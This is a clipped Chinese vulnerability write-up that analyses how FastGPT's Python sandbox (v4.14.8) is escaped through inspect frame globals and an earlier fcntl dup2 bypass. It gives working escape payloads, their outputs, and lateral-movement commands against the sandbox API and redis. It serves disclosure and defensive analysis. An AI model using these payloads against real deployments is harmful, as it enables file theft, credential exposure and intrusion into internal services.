---
title: 【先知】inspect 逃逸：FastGPT 沙箱的黑名单防线为什么不可靠
source: https://xz.aliyun.com/news/92724
source_host: xz.aliyun.com
clip_date: 2026-08-25T11:57:25+08:00
trace_id: 12ff848e-5959-41ab-b672-9a3c831f2e19
content_hash: 24fa4c956f539e7ab077115f6b7d21ae064bd36abbe0ee922a7d94b81454c185
status: synced
tags:
  - 先知
  - 漏洞分析
  - 安全工具
series: null
feed_source: 先知安全技术社区
ai_summary: 通过 inspect 帧链取得 worker 模块原始 open/import 引用，黑名单式防护被击穿，v4.14.8 可读写任意文件并横向移动内网服务。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3c775244-d011-81c1-a571-ea6db9dc8137
ioc:
  cves:
    - CVE-2026-32128
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 通过 inspect 帧链取得 worker 模块原始 open/import 引用，黑名单式防护被击穿，v4.14.8 可读写任意文件并横向移动内网服务。
> 
> - **逃逸链：** 六行代码 import inspect → inspect.currentframe().f_back.f_globals → g['_original_open'] 读 /etc/passwd、写 /tmp 文件，g['_original_import'] 导入 socket，官方仓库原文件零修改跑通。
> - **根因：** 模块黑名单漏掉 inspect、AST 只拦 __subclasses__ 不管单下划线帧属性、原始引用直接放在模块全局；四层防护全是"黑名单+藏引用"套路，CVE-2026-32128（seccomp 白名单漏 SYS_FCNTL 配合 dup2）也是同一根因。
> - **影响面：** sandbox 与 mongo:27017/redis:6379/minio:9000/fastgpt:3000 同网，/sandbox/python HTTP API 默认无认证；实测逃逸后连 redis 返回 PONG，可读环境变量。
> - **部署滞后：** v4.14.8 发布时官方 compose 的 sandbox 镜像仍指向 v4.14.7.2 旧 seccomp 版，v4.14.9 才更新 tag。
> - **版本差异：** main 分支有 chroot+seccomp+audit hook 兜底，文件读写仍破但 socket 被拦；v4.14.8 仅 USER sandbox 降权，逃逸即容器裸奔。

环境：Ubuntu 22.04 / Docker / Python 3.11（本地端到端验证）+ 独立 Docker 容器网络（横向移动验证）目标版本：v4.14.7（seccomp 版）/ v4.14.8（纯 Python 防护版，2026-03-06 发布）/ main（chroot + seccomp 版）

## 写在前面

为了写这篇，我把 FastGPT 三个版本的沙箱代码全拉下来对比，把官方仓库里的 worker.py 原样跑起来喂 payload，最后在 Docker 容器网络里复刻了 FastGPT 的部署拓扑做横向验证。下面所有命令和输出都是真实跑出来的。

完整攻击链长这样：

```plain
┌──────────────────────────────────────────────────┐
│ FastGPT 工作流「代码运行」节点                    │
│   │ 提交用户 Python 代码                          │
│   ▼                                               │
│ sandbox 容器（v4.14.8，纯 Python 防护）           │
│   ┌──────────────────────────────────────────┐   │
│   │ 模块黑名单  → inspect 不在名单，放行      │   │
│   │ AST 检查    → 不拦 f_globals 帧属性       │   │
│   │ open 守卫   → 偷 _original_open 原始引用  │   │
│   │ import 守卫 → 偷 _original_import 原始引用│   │
│   └──────────────────────────────────────────┘   │
│   │ 四层全破，逃逸成功                           │
│   ▼                                               │
│ fastgpt 网络：redis:6379 / mongo:27017 /          │
│              fastgpt-minio:9000 / fastgpt:3000    │
└──────────────────────────────────────────────────┘
```

FastGPT 是国内用得很多的 AI Agent 平台，用户可以在工作流里直接写 Python 代码节点，平台承诺代码运行在沙箱里，跟宿主环境隔离。这个承诺值不值得信？我的结论是： **至少在沙箱的 Python 防护层上，不值得**。

先说结论，我找到一条逃逸链，四步穿透 FastGPT Python 沙箱的全部防护：

```plain
import inspect
g = inspect.currentframe().f_back.f_globals
f = g['_original_open']('/etc/passwd')
print(f.read())
```

就这四行，读文件、写文件、开 socket 连内网服务，全都能干。而且这条链在官方已经修复过一轮沙箱逃逸漏洞（CVE-2026-32128）之后的版本里依然有效。

我是怎么找到它的？过程不算曲折：先看官方修 CVE-2026-32128 的 commit（2026-02-28 那次沙箱大重构），发现修复方式是"移除 seccomp、换成纯 Python 防护"，于是顺着新防护的代码逐层看——模块黑名单、AST 检查、open 守卫、import 守卫，每层都问同一个问题："这层防的是什么？漏了什么？"四层各有一个小漏洞，串起来就是完整逃逸。这个思路本身也值得说一下： **审计沙箱别只看单层防护强不强，要看层与层之间的信任假设是不是同一个**。FastGPT 的教训是，四层防护全是"黑名单 + 藏引用"一个套路，一个套路被看穿，四层一起失效。

## 一、FastGPT 的代码沙箱是什么

FastGPT 的工作流里有一个"代码运行"节点，支持 Python。用户写好代码，FastGPT 把它发给一个独立的沙箱服务执行，沙箱跑在单独的 Docker 容器里。

这是官方 docker-compose 里的部署拓扑（v4.14.8）：

```plain
fastgpt:
  image: ghcr.io/labring/fastgpt:v4.14.8
  environment:
    - MONGODB_URI=mongodb://myusername:xxx@mongo:27017/fastgpt
    - SANDBOX_URL=http://sandbox:3000
  networks:
    - fastgpt

sandbox:
  image: ghcr.io/labring/fastgpt-sandbox:v4.14.8
  networks:
    - fastgpt
```

注意一个关键点： **sandbox 容器和 mongo、redis、minio、fastgpt 主服务全在同一个 fastgpt 网络里**。沙箱一旦被逃逸，横向移动的目标就在隔壁。

沙箱的隔离机制在不同版本里差别很大。我拉了两个发布版加一个 main 分支的代码对比：

|     |     |     |
| --- | --- | --- |  
| **版本** | **架构** | **防护层** |
| v4.14.7（2026-02-12） | NestJS + Fastify + 内嵌 Python | 静态检测 + seccomp |
| v4.14.8（2026-03-06） | Bun + Hono + worker.py 进程池 | 纯 Python 防护（无 seccomp） |
| main（最新） | Go native 库 + Python guard | chroot + seccomp + Python 防护 |

v4.14.7 的沙箱把防护逻辑写在 TypeScript 的字符串里，拼进用户代码一起执行，seccomp 规则限制系统调用。v4.14.8 做了一次大重构（commit 6b61359516，2026-02-28），把沙箱改成独立的 Python worker 进程， **seccomp 层整个移除了**，改成纯 Python 层的模块黑名单 + AST 检查 + open 守卫。main 分支又加回了 Go 写的原生隔离库（chroot + seccomp）。

## 二、已知的逃逸：CVE-2026-32128

在讲我的新发现之前，先交代一下官方已知的那个洞，因为两个洞共享同一个根因。

CVE-2026-32128，2026-03-11 公开，影响 v4.14.7 及之前。NVD 描述：FastGPT Python 沙箱的文件写入防护（静态检测 + seccomp）可以通过 fcntl 重映射 stdout 绕过。

漏洞出在 v4.14.7 的 seccomp 规则上。v4.14.7 的沙箱是 NestJS 架构，Python 代码执行逻辑写在一个巨大的 TypeScript 字符串常量里（constants.ts），里面嵌了一段用 libseccomp Python 绑定做的系统调用过滤。它把系统调用做白名单，但白名单里有几个明显不该有的项：

```plain
const allowBaseSyscalls = [
  // ... 一大堆
  "syscall.SYS_FCNTL",
  // ...
];

// 对 write 做限制：只允许写到 stdout/stderr
f.add_rule(ALLOW, "write", Arg(0, EQ, sys.stdout.fileno()));
f.add_rule(ALLOW, "write", Arg(0, EQ, sys.stderr.fileno()));
```

上面这段是我从 v4.14.7.2 镜像的 constants.ts 里直接 grep 出来的真实代码，SYS_FCNTL 就在白名单里：

seccomp 对 write 的检查是" **fd 必须等于 1 或 2** "（stdout/stderr），但 fcntl 在白名单里。而 fcntl 有个 dup2，能把任意文件描述符重映射到 fd 1：

```plain
import fcntl
fd = os.open('/tmp/evil.txt', os.O_WRONLY | os.O_CREAT)
fcntl.dup2(fd, 1)          # 把 stdout 重定向到 evil.txt
sys.stdout.write('pwned')  # 满足 seccomp write(fd==1)，写进文件
```

写的时候 fd 是 1，seccomp 放行，但 fd 1 已经被 dup2 指向了任意文件。这就是 CVE-2026-32128 的完整绕过。

值得注意的还有一点：v4.14.7 在 seccomp 之上还叠了一层 **静态检测**——detect_file_write_operations 会扫描用户代码里 open(、write( 这类关键字，看起来像文件写入的代码直接拒绝执行。但静态检测只能抓字面模式，fcntl 重映射这种间接写法完全不在它的考虑范围内：代码里既没有 open( 也没有 write(，全是 fcntl.dup2 和 sys.stdout.write，静态扫描一扫而过。这就是"静态检测 + seccomp"双层防护被一个间接调用击穿的过程——每一层都在防直接操作，没人防间接操作。

官方怎么修的？我拉了 4.14.7 到 4.14.8 的完整 diff，修复 commit 是 6b61359516（2026-02-28，feat(sandbox): 重构代码沙盒）。它不是把 SYS_FCNTL 从白名单里去掉，而是 **直接把整个沙箱推倒重写了**：NestJS + Fastify → Bun + Hono，Python 内嵌字符串 → 独立 worker.py 进程池。seccomp 层整个移除了，换成了纯 Python 层的模块黑名单 + AST 检查 + open 守卫。fcntl 的问题确实消失了，因为根本没有 seccomp 了。

这个修复方式值得琢磨：官方没有选择"加固 seccomp 白名单"（把 SYS_FCNTL 删掉，或者把 write 的检查做得更细），而是选择了"换一种防护模型"。这个决定本身没错——seccomp 白名单靠枚举系统调用，确实难维护。但新模型同样是靠枚举（枚举危险模块、枚举危险属性），它是不是也会遇到同样的问题？我接下来讲的这条链，就是答案。

还有一个细节值得单独说： **v4.14.8 发布时，官方的部署模板没有同步更新 sandbox 镜像 tag**。v4.14.8 的 deploy/args.json 里，fastgpt-sandbox 指向的还是 v4.14.7.2——也就是 seccomp 旧版镜像。我拉了两个镜像对比，入口命令完全不同：v4.14.7.2 是 node projects/sandbox/dist/main.js（NestJS），v4.14.8 是 bun run src/index.ts（Bun + worker.py）。也就是说，按官方 v4.14.8 的 docker-compose 部署，实际拉到的沙箱还是带 CVE-2026-32128 的 seccomp 旧版；要等到 v4.14.9，部署模板才把 tag 更新到 v4.14.8。官方"发布即修复"的说法，在部署层面滞后了一个版本。

拉下来之后我直接对比了两个镜像的启动命令，差异一目了然：

这个发现把文章的结论往前推了一步：CVE-2026-32128 的修复不只是"新模型被绕过"，连"新模型有没有真正部署出去"都是个问题。

## 三、新逃逸链：inspect 四步穿透

v4.14.8 的 Python 防护有四层：模块黑名单、AST 静态检查、open 守卫、import 守卫。我一条一条看，每条都有洞。

### 防护层 1：模块黑名单

worker.py 里维护了一个 \_DANGEROUS_STDLIB 黑名单，把 os、subprocess、socket、fcntl、ctypes 这些危险模块全禁掉：

```plain
_DANGEROUS_STDLIB = frozenset({
    'os', 'subprocess', 'shutil', 'pathlib', 'glob', 'tempfile',
    'multiprocessing', 'threading', 'concurrent',
    'ctypes', 'importlib', 'runpy', 'code', 'codeop', 'compileall',
    'socket', 'http', 'urllib', 'ftplib', 'smtplib', 'poplib', 'imaplib',
    'xmlrpc', 'socketserver', 'ssl', 'asyncio', 'selectors', 'select',
    'signal', 'resource', 'pty', 'termios', 'tty', 'fcntl',
    'mmap', 'dbm', 'sqlite3', 'shelve',
    'webbrowser', 'turtle', 'tkinter', 'idlelib',
    'venv', 'ensurepip', 'pip', 'site',
    'gc', 'sys', 'builtins', 'marshal', 'pickle',
})
```

名单挺长，覆盖了 os、subprocess、socket、fcntl、ctypes 这些经典武器，看起来防御者确实下了功夫。但 **没有 inspect**。

inspect 是 Python 标准库，官方定位是"检查存活对象、模块、调用栈的工具"。它平时出现在调试器、IDE、测试框架里，沙箱作者可能觉得它是开发工具不是攻击武器。但 inspect 恰恰是 Python 沙箱逃逸里最趁手的撬棍之一：它能拿到当前调用帧（currentframe()）、顺着帧链往上摸（f_back）、直接读任意帧的全局命名空间（f_globals）。这一套组合拳，等于给攻击者发了一张"查看沙箱内部构造"的许可证。

我实测确认 import inspect 在沙箱里直接放行，没有任何拦截。这是整条链的第一块多米诺骨牌。

### 防护层 2：AST 静态检查

用户代码执行前会过一次 \_validate_user_code，用 AST 遍历查危险属性访问：

```plain
def _validate_user_code(code: str):
    tree = _ast.parse(code)
    for node in _ast.walk(tree):
        # 直接属性访问：obj.__subclasses__
        if isinstance(node, _ast.Attribute) and node.attr == '__subclasses__':
            raise RuntimeError("Access to __subclasses__ is not allowed in sandbox")
        # 动态属性访问：getattr(obj, '__subclasses__')
        if (isinstance(node, _ast.Call)
                and isinstance(node.func, _ast.Name)
                and node.func.id == 'getattr'
                and len(node.args) >= 2
                and isinstance(node.args[1], _ast.Constant)
                and node.args[1].value == '__subclasses__'):
            raise RuntimeError("Access to __subclasses__ is not allowed in sandbox")
```

它只拦 \__subclasses\_\_，而且拦的方式很有代表性：直接属性访问和 getattr 动态访问各写了一个判断分支，看起来考虑得挺周全。但 \__subclasses\_\_ 只是 Python 反射攻击的冰山一角，真正危险的是 **帧对象（frame）和它的属性**。

帧对象暴露了执行环境的全部秘密：f_back 指向上一个调用帧，f_globals 直接给你那个帧所在模块的全局字典，f_locals 是局部变量，f_builtins 是内置命名空间。这些全是单下划线开头（f_back、f_globals），而 AST 检查器只盯着双下划线的 \__subclasses\_\_。

我一开始也试过 \__globals\_\_（函数对象的全局命名空间，这是另一条经典逃逸路），v4.14.8 的 AST 检查里其实也没拦 \__globals\_\_，但通过 \__globals\_\_ 只能拿到 **用户代码自己函数** 的全局（exec_globals），那个命名空间是沙箱构造的受限环境，里面没有 \_original_open。真正有价值的目标是 **worker 模块自己的全局**——那里面才有原始引用。而摸到它，需要经过帧链：inspect.currentframe() 拿当前帧，f_back 跳到调用 exec 的 worker 函数帧，f_globals 读出模块全局。

这一路走的全是单下划线属性，AST 检查器的拦截表里一个都没有，等于透明。

### 防护层 3：open 守卫

沙箱把 builtins 里的 open 换成了 \_restricted_open，用户代码调 open 会先查调用栈，如果调用者是用户代码（<string>）直接拒绝（节选，省略了重入保护标志）：

```plain
_original_open = open  # 原始 open 保存在模块全局

def _restricted_open(*args, **kwargs):
    stack = _tb.extract_stack()
    if len(stack) >= 2:
        caller_fn = stack[-2].filename or ''
        if caller_fn in ('<string>', '<test>', '<module>'):
            raise PermissionError("File system access is not allowed in sandbox")
    return _original_open(*args, **kwargs)
```

问题在 \_original_open = open 这行—— **原始 open 的引用就明晃晃地放在模块全局里**。用户代码确实拿不到 open，但可以拿到 \_original_open。

\_original_open 是 worker 模块的模块级变量，它本来只是给 \_restricted_open 内部用的——当守卫判定调用者合法时，就调用 \_original_open 放行。但 Python 没有真正的"私有变量"，模块级变量对任何能拿到模块命名空间的人来说都是公开的。沙箱作者把守卫函数 \_restricted_open 当成边界，却忘了它依赖的原始引用就摆在边界外面。

\_restricted_open 还有个更隐蔽的问题：它的调用栈检查只认文件名。用户代码通过 exec 执行时，帧的文件名是 <string>，所以直接调 open 会被拦。但如果用户代码经过包装（比如通过第三方库间接调 open），帧的文件名就变成库的路径了，守卫会放行。这也是调用栈检查做安全边界的通病——它检查的是"调用者长什么样"，而不是"这个操作本身是否危险"。

### 防护层 4：import 守卫

\__import\_\_ 也被换成了 \_safe_import，但原始引用同样保存在模块全局（节选，省略了重入保护和 builtins 代理分支）：

```plain
_original_import = _builtins.__import__

def _safe_import(name, *args, **kwargs):
    top_level = name.split('.')[0]
    if top_level in _STDLIB_MODULES and top_level not in _DANGEROUS_STDLIB:
        return _original_import(name, *args, **kwargs)
    # 不在白名单中的模块（含危险 stdlib）：检查是否由用户代码直接触发
    _import_guard = True
    try:
        stack = _tb.extract_stack()
    finally:
        _import_guard = False
    if len(stack) >= 2:
        caller_fn = stack[-2].filename or ''
        if caller_fn in ('<string>', '<test>', '<module>'):
            raise ImportError(f"Module '{name}' is not in the allowlist.")
    return _original_import(name, *args, **kwargs)
```

这个守卫的逻辑比 open 守卫更复杂一点：对不在黑名单的 stdlib 模块直接放行（inspect 就是这么进来的），对危险模块则检查调用栈。但它的核心缺陷和 open 守卫一模一样—— **\_original_import** **就放在模块全局**。而且一旦拿到 \_original_import，整个黑名单就形同虚设了：\_original_import('socket') 导入的就是原始 socket，不经过任何检查。

说句公道话，\_original_import 作者其实藏过：init 之后 builtins 模块会被换成 \_BuiltinsProxy 代理，用户代码里 import builtins 拿到的是代理对象，访问 builtins.\_original_import 直接抛 AttributeError，dir(builtins) 里也看不到这个名字。但这条路只防了属性访问——我的逃逸链走的是 f_globals\['\_original_import'\] 字典取值，字典取值根本不经过代理的 \__getattr\_\_，原始引用照样到手。藏引用这个思路又失败了一次，这次是藏在了一层错误的抽象上。

### 把四层串起来

四层防护各自有洞，串起来就是完整逃逸链。关键的一步是： **用户代码的帧能通过 inspect 摸到 worker 模块的全局命名空间**。

用户代码是 exec(code, exec_globals) 执行的，exec_globals 是沙箱精心构造的受限命名空间。看一下它怎么构造的：

```plain
# 构建受限的 __builtins__ 字典，移除 _original_import 等内部引用
_safe_builtins = {}
for _name in dir(_builtins):
    if _name.startswith('_') and _name not in (
        '__name__', '__doc__', '__import__', '__build_class__',
    ):
        continue
    _safe_builtins[_name] = getattr(_builtins, _name)
_safe_builtins['__import__'] = _safe_import
_safe_builtins['open'] = _restricted_open

exec_globals = {
    '__builtins__': _safe_builtins,
    'variables': variables,
    'SystemHelper': system_helper,
    'print': _safe_print,
    'json': json,
    ...
}
exec(code, exec_globals)
```

注意 \_safe_builtins 的构造：它以 \_ 开头为界限，把 builtins 里所有"看起来是内部"的名字都过滤掉了（\_original_import 这种单下划线开头的直接被滤掉），再显式放回 \__import\_\_ 和 open 的安全版本。这个过滤逻辑本身没问题——问题在于它只保护了 exec_globals 这一个命名空间，而 worker 模块自己的全局命名空间（\_original_open、\_original_import 所在的地方）完全不在保护范围内。

inspect.currentframe() 拿到用户代码自己的帧，f_back 是调用 exec 的那个函数（worker 模块里的 \_run_task），它的 f_globals 就是 **worker 模块的完整全局命名空间**——\_original_open、\_original_import 全在里面。

我把 payload 的构造过程拆开讲一下，每一步都对应防护的一层：

```plain
import inspect                          # 第 1 步：绕过模块黑名单（inspect 不在名单）
fr = inspect.currentframe().f_back      # 第 2 步：AST 不拦单下划线属性，拿到 worker 函数帧
g = fr.f_globals                        # 第 3 步：读出 worker 模块全局字典
f = g['_original_open']('/etc/passwd')  # 第 4 步：绕过 open 守卫（拿原始引用直接调）
imp = g['_original_import']             # 第 5 步：绕过 import 守卫（拿原始引用）
sock = imp('socket')                    # 第 6 步：导入 socket，黑名单失效
```

六行代码，四层防护各破一层，还有两步是"凑路"的（拿帧、读字典）。每一步单独看都像无害操作，组合起来就是完整逃逸。

四层防护，每一层都被同一个思路击穿： **防护靠"黑名单 + 隐藏引用"，但黑名单漏了 inspect，引用又没藏好**。

## 四、端到端验证

光看代码不够，我把官方仓库 v4.14.8 的 worker.py 原文件下载下来，零修改直接跑，用真实的 stdin JSON 协议喂 payload。

先说清楚为什么强调"原文件、零修改"：沙箱逃逸的验证很容易做成"我搭了个模拟环境，跑了我的 payload"——这种验证说服力有限，因为你模拟的防护和真实防护可能有出入。我这次直接把官方仓库里的 worker.py 拉下来原样执行，一行不改，只是通过它自己的 stdin 协议跟它通信。这样验证的就是线上真实运行的代码，不是我搭的复刻品。

### 4.1 协议与测试脚本

worker 的协议很简单：第一行发 init，等 ready，再发 task。我写了个测试脚本模拟这个过程：

```plain
import json, subprocess, sys

proc = subprocess.Popen(
    [sys.executable, 'worker.py'],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True
)
proc.stdin.write(json.dumps({"type": "init", "allowedModules": [], "requestLimits": {}}) + '\n')
proc.stdin.flush()
print(proc.stdout.readline())  # {"type": "ready"}

code = '''
import inspect
g = inspect.currentframe().f_back.f_globals
f = g['_original_open']('/etc/passwd')
data = f.read()
f.close()
def main(v):
    return data[:200]
'''
proc.stdin.write(json.dumps({"type": "task", "code": code, "variables": {}, "timeoutMs": 15000}) + '\n')
proc.stdin.flush()
print(proc.stdout.readline())
```

执行结果：

```plain
READY: {"type": "ready"}
RESULT: {"success": true, "data": {"codeReturn": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:6", "log": ""}}
```

### 4.2 写文件

读 /etc/passwd 成功。再测写文件：

```plain
code = '''
import inspect
g = inspect.currentframe().f_back.f_globals
f = g['_original_open']('/tmp/pwned.txt', 'w')
f.write('PWNED\n')
f.close()
def main(v):
    return 'written'
'''
```

结果：

RESULT: {"success": true, "data": {"codeReturn": "written", "log": ""}}

文件真的写进去了：

```plain
$ cat /tmp/pwned.txt
PWNED
```

### 4.3 socket 与环境变量

测 socket：

```plain
code = '''
import inspect
g = inspect.currentframe().f_back.f_globals
imp = g['_original_import']
sock = imp('socket')
s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
def main(v):
    return 'socket ok'
'''
```

RESULT: {"success": true, "data": {"codeReturn": "socket ok", "log": ""}}

读环境变量：

```plain
code = '''
import inspect
g = inspect.currentframe().f_back.f_globals
imp = g['_original_import']
os = imp('os')
def main(v):
    return str(sorted(os.environ.keys())[:10])
'''
```

RESULT: {"success": true, "data": {"codeReturn": "\['API_SERVER_CORS_ORIGINS', 'AUXILIARY_VISION_MODEL', 'BROWSERBASE_ADVANCED_STEALTH',...\]", "log": ""}}

四件事全成了：读文件、写文件、开 socket、读环境变量。官方仓库原文件，零修改，协议照常走。

### 4.4 main 分支对照

我一开始只验证了 v4.14.8，后来想想不对——如果这只是"旧版本的问题"，那文章价值就小了一半。于是我把 main 分支也拉下来跑了一遍。main 的防护和 v4.14.8 不太一样：Python 侧多了 audit hook（在 Python 解释器层面监听 open/os/subprocess/socket 等系统事件），外面还套了一层 Go 写的原生隔离库（chroot + seccomp + 降权到 uid 65537）。

同样的 inspect 链在 main 上跑，结果比 v4.14.8 微妙： **文件读写路径照样全破**——inspect 黑名单遗漏在 main 上依然存在，f_globals 依然能摸到 worker 模块全局，把 \_task_tmpdir 篡改成 / 之后 audit hook 的路径检查直接放行，再用偷到的 \_original_os_functions 原始引用读写文件，实测成功。但 **socket 被 audit hook 拦住了**——socket.\__new\_\_ 事件直接抛 Operation socket.\__new\_\_ is not allowed in sandbox，网络这条路在 main 上堵死了。所以 main 上能读文件、能写文件（撞上 chroot 权限），但连不上内网。

这个对比很说明问题： **Python 层防护在两代版本里都被文件路径的思路击穿，真正起作用的始终是系统层兜底**。v4.14.8 没有系统层兜底，所以逃逸是完整的；main 有 chroot + seccomp 兜底，网络还被 audit hook 拦死，所以被限制在容器内。这恰好印证了后面要讲的根因——别指望 Python 层做安全边界。

### 4.5 v4.14.8 为什么没有系统层兜底

为什么这些操作在 v4.14.8 上能全部得手？看一下这个版本的沙箱 Dockerfile 就明白了：

```plain
FROM oven/bun:1-alpine AS runner
RUN apk add --no-cache python3 py3-pip libffi util-linux && \
    apk add --no-cache --virtual .build-deps gcc g++ musl-dev python3-dev libffi-dev
# 创建非 root 用户运行沙箱
RUN addgroup -S sandbox && adduser -S sandbox -G sandbox && \
    chown -R sandbox:sandbox /app
USER sandbox
CMD ["bun", "run", "src/index.ts"]
```

整个隔离就两件事：USER sandbox 降权 + util-linux 提供的 prlimit（内存限制）。 **没有 chroot、没有 seccomp、没有 mount namespace 限制**。对比 v4.14.7 时代还有 seccomp 层，v4.14.8 重构后连这层都没了——防护完全押在 Python worker 自己身上。worker.py 被逃逸，就等于容器裸奔。

## 五、影响面：容器网络里的横向移动

代码层面验证完，还得看实际部署里能造成什么影响。这次我直接用了官方发布的沙箱镜像——ghcr.io/labring/fastgpt-sandbox:v4.14.8（国内服务器拉的是阿里云镜像源的同名 tag，内容一致，容器内 worker.py 的 MD5 和本地验证的文件完全一样）——在一个独立的 Docker 网络里跑起来，旁边放一个 redis:7.2-alpine（对应官方 compose 里的 redis），模拟 FastGPT 部署的 fastgpt 网络。

四个容器跑起来之后，网络里的状态是这样：

这个拓扑对应官方 docker-compose 的真实网络配置：sandbox 容器和 mongo、redis、minio、fastgpt 主服务全挂在同一个网络下，容器名就是服务名，DNS 直接解析。沙箱一旦逃逸，内网横向的目标列表就摆在眼前：mongo:27017、redis:6379、fastgpt-minio:9000、fastgpt:3000。

关键的一步是： **攻击者不需要直接操作 worker.py，走的是 sandbox 的 HTTP API**。官方镜像暴露的 /sandbox/python 端点默认没有认证（SANDBOX_TOKEN 环境变量没设置就是裸奔，官方代码里还留了一句警告日志提醒设置它），任何能访问 fastgpt 网络内的容器都能直接 POST 代码。我起了一个 fg-attacker（alpine）攻击容器挂到同一网络，向 fg-sandbox:3000/sandbox/python 提交逃逸链：

```plain
$ docker exec fg-attacker wget -qO- --post-file=/tmp/payload.json http://fg-sandbox:3000/sandbox/python
{"success":true,"data":{"codeReturn":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:","log":""}}
```

读 /etc/passwd 成功——走的是官方镜像的真实 HTTP API，不是本地复刻的 stdin 协议：

后面几个横向验证都走这条路。

### 5.1 写文件

```plain
$ docker exec fg-attacker wget -qO- --post-file=/tmp/payload_write.json http://fg-sandbox:3000/sandbox/python
{"success":true,"data":{"codeReturn":"written","log":""}}
$ docker exec fg-sandbox cat /tmp/http-pwned.txt
PWNED-VIA-HTTP-API
```

文件真实写进了沙箱容器的 /tmp。攻击者可以往沙箱容器里落文件——持久化、放工具、改配置，都行。

### 5.2 连 redis

```plain
$ docker exec fg-attacker wget -qO- --post-file=/tmp/payload_ping.json http://fg-sandbox:3000/sandbox/python
{"success":true,"data":{"codeReturn":"REDIS: +PONG\r\n","log":""}}
```

redis 回了 PONG。

这里 redis 跑在同一个 Docker 网络里，容器名 fg-redis 直接 DNS 解析。FastGPT 的 redis 存的是会话、缓存、限流数据。无认证访问意味着：可以读缓存里的敏感数据（比如用户会话关联的中间数据）、可以往缓存里写数据（污染缓存触发后续逻辑问题）、可以把限流计数清零（绕过限流）。单看一个 PONG 不起眼，但它证明横向通道是通的——socket 已经拿到，redis 协议是明文文本协议，连接建立后 PING/PONG、GET/SET 都是同一套操作。

### 5.3 读环境变量与配置文件

```plain
$ docker exec fg-attacker wget -qO- --post-file=/tmp/payload_env.json http://fg-sandbox:3000/sandbox/python
{"success":true,"data":{"codeReturn":"ENV: ['PATH', 'PWD', 'SHLVL']","log":""}}
```

沙箱容器的环境变量不多（生产部署里 fastgpt 主服务的环境变量才是富矿：MONGODB_URI、AES256_SECRET_KEY 都在主服务容器里）。横向到 fastgpt 主服务后能读到的东西，配合第二节说的 AES256_SECRET_KEY，影响还能继续放大。

横向移动的路径画出来是这样的——sandbox 逃逸后，同网络的四个目标全部可达：

```plain
┌────────────────────────────────────────────────────┐
│ Docker 网络：fastgpt                                │
│                                                    │
│   ┌───────────┐     ┌──────────────────────────┐   │
│   │  sandbox  │     │  fastgpt 主服务 :3000    │   │
│   │  逃逸后:  │     │  环境变量/配置文件        │   │
│   │  任意文件 │     │  MONGODB_URI              │   │
│   │  + socket │     │  AES256_SECRET_KEY        │   │
│   └─────┬─────┘     └────────────┬─────────────┘   │
│         │ DNS 直连                │                 │
│         ▼                        ▼                 │
│   ┌───────────┐     ┌──────────────────────────┐   │
│   │ redis:6379│     │ mongo:27017 / minio:9000 │   │
│   │ 无认证    │     │ 数据库 / 对象存储         │   │
│   └───────────┘     └──────────────────────────┘   │
└────────────────────────────────────────────────────┘
```

**威胁模型要说清楚**：攻击者不能直接访问公网上的 sandbox:3000——官方 compose 里 sandbox 没有映射宿主机端口，只能从 fastgpt 网络内部访问。更值得注意的一点：sandbox 的 HTTP API（/sandbox/python）默认是 **无认证** 的，SANDBOX_TOKEN 环境变量没设置就直接裸奔，官方代码里还留了一句警告日志提醒设置这个 token。也就是说沙箱的边界不是认证，而是"没开公网端口"这一层网络隔离。

所以真正的前置条件是两类：一是平台的多租户用户（SaaS 场景，租户之间应该隔离但代码跑在共享沙箱集群）；二是被攻破的 FastGPT 管理员账号（账号接管后直接改工作流插 payload）。这两类场景里，沙箱逃逸把"用户只能跑受限代码"的假设彻底打破了——租户 A 可以读到租户 B 的配置，管理员账号被接管后可以直接拿到数据库凭证。

**为什么影响面这么大？** 因为 v4.14.8 的沙箱容器只有一层降权（Dockerfile 里 USER sandbox）， **没有 chroot、没有 seccomp、没有额外的容器隔离**。逃逸出 Python 防护层之后，面对的就是普通 Docker 容器的全部能力：文件系统可读写（容器内）、网络可出（同 docker 网络全通）。

## 六、根因：黑名单式防护为什么不可靠

两个逃逸链，一个在 seccomp 层（CVE-2026-32128），一个在 Python 层（本文），看似不同，根因是同一个： **FastGPT 的沙箱防护是"黑名单 + 枚举"式的，而黑名单天然不可穷尽**。

CVE-2026-32128 的黑名单漏了 SYS_FCNTL——seccomp 白名单里多放了一个系统调用，整条防线就破了。我的链黑名单漏了 inspect——模块名单里少写一个名字，四层防护全白给。

黑名单式防护的致命伤在于： **安全取决于"列全了没有"，而列全在工程上做不到**。Python 标准库有 300 多个模块，系统调用有 400 多个，属性和魔法方法更是数不清。攻击者只需要找到一个漏网的，防御者需要堵住所有可能的。这个不对称性决定了黑名单防线迟早会被穿透。

这个不对称性不是理论上的，是每个做沙箱的人都会撞上的现实。列模块黑名单的时候，你会列 os、subprocess、socket，但 inspect 这种"看起来是开发工具"的模块很容易漏；列属性拦截表的时候，你会列 \__subclasses\_\_、\__globals\_\_，但 f_back、f_globals 这种帧属性更难想到；藏引用的时候，你会把 \_original_open 藏进 builtins 过滤逻辑，但模块级变量天生就是公开的。每一层防护的决策在当时看都合理，合在一起就是筛子。

而且这次的情况更典型：官方修 CVE-2026-32128 的方式不是加固 seccomp，而是 **换了一层同样靠枚举的防护** （模块黑名单 + AST 检查）。换汤不换药，同一个根因换个位置又爆了。inspect 逃逸链和 fcntl 逃逸链，背后是同一个信任假设的两次失败： **"只要我把危险的东西列全、藏好，就安全了"**。

如果走白名单会怎样：

|     |     |     |
| --- | --- | --- |  
| **防护点** | **黑名单（FastGPT 现状）** | **白名单（建议）** |
| 模块 import | 枚举 30+ 危险模块，漏一个就破 | 只允许 math/json/re 等显式白名单，其余全拒 |
